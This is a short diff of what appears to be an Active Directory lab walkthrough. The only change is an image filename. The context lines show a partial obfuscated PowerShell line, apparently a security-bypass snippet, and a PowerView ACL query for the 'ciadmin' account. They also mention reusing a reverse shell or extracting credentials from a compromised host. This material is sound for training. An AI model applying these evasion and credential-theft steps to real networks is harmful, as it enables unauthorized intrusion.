@@ -8,7 +8,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption><p>S-1-5-21-719815819-3726368948-3917688648-1121</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>S-1-5-21-719815819-3726368948-3917688648-1121</p></figcaption></figure>
 
 Recall that we compromised ciadmin from dcorp-ci. We can either use the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci.
 
